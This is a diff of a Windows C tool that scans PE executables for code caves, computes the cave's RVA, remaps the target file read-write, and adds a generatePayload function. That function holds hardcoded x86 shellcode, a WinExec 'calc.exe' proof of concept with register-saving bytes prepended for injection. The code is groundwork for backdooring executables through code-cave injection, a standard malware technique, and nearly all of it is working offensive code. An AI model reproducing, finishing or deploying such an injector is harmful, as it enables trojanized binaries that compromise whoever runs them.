@@ -8,11 +8,11 @@ typedef struct _CAVE_INFO
 	DWORD dwSize;
 } CAVE_INFO, * PCAVE_INFO;
 
-int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer)
+int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, DWORD *offset)
 {
-	PBYTE pRawData = pBuffer + pSectionHeader->PointerToRawData;
+	PBYTE pSectionStart = pBuffer + pSectionHeader->PointerToRawData;
 	DWORD dwSectionSize = pSectionHeader->SizeOfRawData;
-	printf("[+] Raw data pointer: 0x%p\n", pRawData);
+	printf("[+] Section start address: 0x%p\n", pSectionStart);
 
 	PBYTE pStartAddress = NULL;
 	PBYTE pEndAddress = NULL;
@@ -24,20 +24,20 @@ int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer)
 
 	for (DWORD i = 0; i <= dwSectionSize; i++)
 	{
-		if (*(BYTE*)(pRawData + i) == 0xCC ||
-			*(BYTE*)(pRawData + i) == 0x90 ||
-			*(BYTE*)(pRawData + i) == 0x00)
+		if (*(BYTE*)(pSectionStart + i) == 0xCC ||
+			*(BYTE*)(pSectionStart + i) == 0x90 ||
+			*(BYTE*)(pSectionStart + i) == 0x00)
 		{
-			previousAddress = pRawData + i;
+			previousAddress = pSectionStart + i;
 
 			if (pStartAddress == NULL)
 			{
-				pStartAddress = pRawData + i;
+				pStartAddress = pSectionStart + i;
 			}
 			else
 			{
 				caveSize++;
-				pEndAddress = pRawData + i;
+				pEndAddress = pSectionStart + i;
 			}
 		}
 		else
@@ -74,10 +74,57 @@ int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer)
 		printf("  Start Address: 0x%p\n", caveInfo[i].pStartAddress);
 		printf("  End Address: 0x%p\n", caveInfo[i].pEndAddress);
 		printf("  Size: %d bytes\n", caveInfo[i].dwSize);
-		printf("  Offset: 0x%zX\n", (DWORD64)(caveInfo[i].pStartAddress - pRawData));
+		DWORD caveSectionOffset = (DWORD)(caveInfo[i].pStartAddress - pSectionStart);
+		DWORD caveRVA = pSectionHeader->VirtualAddress + caveSectionOffset;
+		printf("  Offset: 0x%04X\n", caveRVA);
+		// TODO: Grab largest cave or give user option to select cave instead of just grabbing the last one.
+		*offset = caveRVA;
 	}
 
 	return 0;
+}
+
+void generatePayload()
+{
+	unsigned char saveReg[] = { 0x60, 0x9C }; // pushad; pushfd
+	unsigned char sc[] = {0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00,
+		0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c,
+		0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
+		0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
+		0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c,
+		0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1, 0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3,
+		0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31,
+		0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03,
+		0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01,
+		0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04,
+		0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a,
+		0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a,
+		0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f,
+		0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd,
+		0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05,
+		0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x53, 0xff, 0xd5, 0x63, 0x61,
+		0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00};
+
+	unsigned char payload[sizeof(saveReg) + sizeof(sc)];
+
+	memcpy(payload, saveReg, sizeof(saveReg));
+	memcpy(payload + sizeof(saveReg), sc, sizeof(sc));
+
+	for (int i = 0; i < sizeof(payload); i++)
+	{
+		if (i == sizeof(payload) - 1)
+		{
+			printf("0x%02X", payload[i]);
+		}
+		else
+		{
+			printf("0x%02X, ", payload[i]);
+		}
+		if ((i + 1) % 12 == 0)
+		{
+			printf("\n");
+		}
+	}
 }
 
 int main(int argc, char *argv[])
@@ -97,17 +144,34 @@ int main(int argc, char *argv[])
 		return 1;
 	}
 
-	PBYTE pBuffer = NULL;
+	//PBYTE pBuffer = NULL;
 
-	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		printf("[*] Error opening file: %d\n", GetLastError());
 		return 1;
 	}
 
-	DWORD dwFileSize = GetFileSize(hFile, NULL);
+	HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
+	if (hMap == NULL)
+	{
+		printf("[*] Error creating file mapping: %d\n", GetLastError());
+		CloseHandle(hFile);
+		return 1;
+	}
 
+	LPVOID pBuffer = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+	if (pBuffer == NULL)
+	{
+		printf("[*] Error mapping view of file: %d\n", GetLastError());
+		CloseHandle(hMap);
+		CloseHandle(hFile);
+		return 1;
+	}
+
+	/*
+	DWORD dwFileSize = GetFileSize(hFile, NULL);
 	printf("[+] File size: %d bytes\n", dwFileSize);
 
 	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
@@ -125,19 +189,22 @@ int main(int argc, char *argv[])
 		CloseHandle(hFile);
 		return 1;
 	}
+	*/
 
 	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;
-	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)(pBuffer + pDosHeader->e_lfanew);
+	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pBuffer + pDosHeader->e_lfanew);
 	ULONG_PTR entryPoint = (ULONG_PTR)pBuffer + pNTHeaders->OptionalHeader.AddressOfEntryPoint;
 
 	printf("[+] Buffer: 0x%p\n", (void*)pBuffer);
 
+
 	PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(pNTHeaders);
+	DWORD offset = 0;
 
 	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++)
 	{
 		printf("[+] Section %d: %s\n", i + 1, sectionHeaders[i].Name);
-		printf("[+] Data Location: 0x%p\n", pBuffer + sectionHeaders[i].PointerToRawData);
+		printf("[+] Data Location: 0x%p\n", (PBYTE)pBuffer + sectionHeaders[i].PointerToRawData);
 		printf("    Virtual Address: 0x%08X\n", sectionHeaders[i].VirtualAddress);
 		printf("    Size of Raw Data: 0x%08X\n", sectionHeaders[i].SizeOfRawData);
 		printf("    Pointer to Raw Data: 0x%08X\n", sectionHeaders[i].PointerToRawData);
@@ -147,11 +214,17 @@ int main(int argc, char *argv[])
 			printf("    [*] Virtual Address: 0x%08X\n", sectionHeaders[i].VirtualAddress);
 			printf("    [*] Size of Raw Data: 0x%08X\n", sectionHeaders[i].SizeOfRawData);
 			printf("    [*] Pointer to Raw Data: 0x%08X\n", sectionHeaders[i].PointerToRawData);
-			enumerateSection(&sectionHeaders[i], pBuffer);
+			enumerateSection(&sectionHeaders[i], (PBYTE)pBuffer, &offset);
 		}
 	}
 
-	HeapFree(GetProcessHeap(), 0, pBuffer);
+	printf("Cave offset: 0x%02x\n", offset);
+
+	generatePayload();
+
+	UnmapViewOfFile(pBuffer);
+	CloseHandle(hMap);
+	CloseHandle(hFile);
 
 	return 0;
 }
